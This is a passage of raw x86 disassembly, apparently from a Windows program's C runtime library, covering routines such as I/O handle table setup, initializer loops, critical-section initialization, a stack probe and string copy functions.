  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
